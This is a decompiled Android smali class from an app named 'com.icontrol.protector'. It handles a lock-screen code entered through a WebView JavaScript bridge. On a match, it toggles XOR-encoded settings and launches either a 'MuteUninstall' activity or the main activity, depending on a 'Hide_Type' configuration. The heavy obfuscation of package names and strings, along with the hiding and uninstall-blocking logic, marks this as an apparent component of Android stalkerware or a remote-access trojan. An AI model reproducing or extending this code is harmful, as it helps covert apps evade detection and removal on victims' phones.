.class public Lcom/icontrol/protector/LockActivity$d;
.super Ljava/lang/Object;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/icontrol/protector/LockActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "d"
.end annotation


# instance fields
.field a:Landroid/content/Context;

.field final synthetic b:Lcom/icontrol/protector/LockActivity;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/LockActivity;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/LockActivity$d;->b:Lcom/icontrol/protector/LockActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p2, p0, Lcom/icontrol/protector/LockActivity$d;->a:Landroid/content/Context;

    return-void
.end method


# virtual methods
.method public OK(Ljava/lang/String;)V
    .locals 11
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    :try_start_0
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    const/4 v1, 0x4

    if-lt v0, v1, :cond_3

    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    invoke-static {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->k(Landroid/content/Context;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    sget-object v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->M:Ljava/lang/String;

    const-string v2, ""

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/high16 v2, 0x800000

    const-class v3, Lcom/icontrol/protector/ActivMain;

    const/high16 v4, 0x40000000    # 2.0f

    const-class v5, Lcom/icontrol/protector/MuteUninstall;

    const/16 v6, 0xa

    const/high16 v7, 0x10000000

    const/4 v8, 0x0

    const/4 v9, 0x1

    const/16 v10, 0x8

    if-lez v1, :cond_1

    :try_start_1
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_3

    sget-object p1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    new-array v0, v6, [B

    fill-array-data v0, :array_0

    new-array v1, v10, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    iget-object p1, p0, Lcom/icontrol/protector/LockActivity$d;->b:Lcom/icontrol/protector/LockActivity;

    invoke-virtual {p1}, Landroid/app/Activity;->finish()V

    sget-object p1, Lcom/icontrol/protector/My_Configs;->D_iao:Ljava/lang/String;

    new-array v0, v9, [B

    const/16 v6, -0x13

    aput-byte v6, v0, v8

    new-array v6, v10, [B

    fill-array-data v6, :array_2

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_3

    sget-object p1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    new-array v0, v10, [B

    fill-array-data v0, :array_3

    new-array v6, v10, [B

    fill-array-data v6, :array_4

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_3

    sget-object p1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    new-array v0, v10, [B

    fill-array-data v0, :array_5

    new-array v6, v10, [B

    fill-array-data v6, :array_6

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    sget-object p1, Lcom/icontrol/protector/My_Configs;->Hide_Type:Ljava/lang/String;

    new-array v0, v9, [B

    const/16 v1, 0x74

    aput-byte v1, v0, v8

    new-array v1, v10, [B

    fill-array-data v1, :array_7

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    new-instance p1, Landroid/content/Intent;

    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p1, v0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    :goto_0
    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    invoke-virtual {v0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_1

    :cond_0
    new-instance p1, Landroid/content/Intent;

    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    invoke-direct {p1, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    goto :goto_0

    :cond_1
    sget-object p1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    new-array v0, v6, [B

    fill-array-data v0, :array_8

    new-array v1, v10, [B

    fill-array-data v1, :array_9

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    iget-object p1, p0, Lcom/icontrol/protector/LockActivity$d;->b:Lcom/icontrol/protector/LockActivity;

    invoke-virtual {p1}, Landroid/app/Activity;->finish()V

    sget-object p1, Lcom/icontrol/protector/My_Configs;->D_iao:Ljava/lang/String;

    new-array v0, v9, [B

    const/16 v6, 0x10

    aput-byte v6, v0, v8

    new-array v6, v10, [B

    fill-array-data v6, :array_a

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_3

    sget-object p1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    new-array v0, v10, [B

    fill-array-data v0, :array_b

    new-array v6, v10, [B

    fill-array-data v6, :array_c

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_3

    sget-object p1, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    new-array v0, v10, [B

    fill-array-data v0, :array_d

    new-array v6, v10, [B

    fill-array-data v6, :array_e

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    sget-object p1, Lcom/icontrol/protector/My_Configs;->Hide_Type:Ljava/lang/String;

    new-array v0, v9, [B

    const/16 v1, -0x6d

    aput-byte v1, v0, v8

    new-array v1, v10, [B

    fill-array-data v1, :array_f

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_2

    new-instance p1, Landroid/content/Intent;

    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p1, v0, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    goto/16 :goto_0

    :cond_2
    new-instance p1, Landroid/content/Intent;

    sget-object v0, Lcom/icontrol/protector/LockActivity;->d:Landroid/content/Context;

    invoke-direct {p1, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0

    :catch_0
    :cond_3
    :goto_1
    return-void

    nop

    :array_0
    .array-data 1
        -0xct
        0x19t
        0x3ct
        0x15t
        0x2et
        -0x73t
        0x1bt
        -0xft
        -0x15t
        0x16t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x7ct
        0x78t
        0x4ft
        0x66t
        0x59t
        -0x1et
        0x69t
        -0x6bt
    .end array-data

    :array_2
    .array-data 1
        -0x24t
        0x7dt
        0x14t
        0x72t
        0x3t
        0x7et
        0x4ct
        0x48t
    .end array-data

    :array_3
    .array-data 1
        -0x1ft
        0xdt
        0x38t
        0x14t
        0x5t
        -0x79t
        -0x42t
        -0x75t
    .end array-data

    :array_4
    .array-data 1
        -0x74t
        0x62t
        0x5ct
        0x71t
        0x61t
        -0x12t
        -0x21t
        -0x1ct
    .end array-data

    :array_5
    .array-data 1
        -0x4et
        0x66t
        -0x3at
        0x4ft
        0x7ft
        -0x4dt
        0x55t
        0x3ct
    .end array-data

    :array_6
    .array-data 1
        -0x21t
        0x9t
        -0x5et
        0x2at
        0x1bt
        -0x26t
        0x34t
        0x53t
    .end array-data

    :array_7
    .array-data 1
        0x1ft
        0x6et
        -0x3bt
        0x72t
        0x62t
        -0x75t
        0x39t
        0x57t
    .end array-data

    :array_8
    .array-data 1
        0x2t
        -0x4at
        0x6et
        0x14t
        0x2at
        0x1at
        0x68t
        0x21t
        0x1dt
        -0x47t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x72t
        -0x29t
        0x1dt
        0x67t
        0x5dt
        0x75t
        0x1at
        0x45t
    .end array-data

    :array_a
    .array-data 1
        0x21t
        0x23t
        -0x3et
        -0x49t
        0x68t
        -0x2ct
        -0x75t
        -0x42t
    .end array-data

    :array_b
    .array-data 1
        0x78t
        -0x29t
        0x55t
        0x27t
        -0x4t
        0x22t
        -0x16t
        0x33t
    .end array-data

    :array_c
    .array-data 1
        0x15t
        -0x48t
        0x31t
        0x42t
        -0x68t
        0x4bt
        -0x75t
        0x5ct
    .end array-data

    :array_d
    .array-data 1
        0x6dt
        -0x3ft
        0x10t
        0x20t
        -0x7ft
        0x5ft
        0x42t
        0x60t
    .end array-data

    :array_e
    .array-data 1
        0x0t
        -0x52t
        0x74t
        0x45t
        -0x1bt
        0x36t
        0x23t
        0xft
    .end array-data

    :array_f
    .array-data 1
        -0x8t
        -0x69t
        0x66t
        -0x1ct
        0x3et
        0x23t
        0x1dt
        -0x28t
    .end array-data
.end method
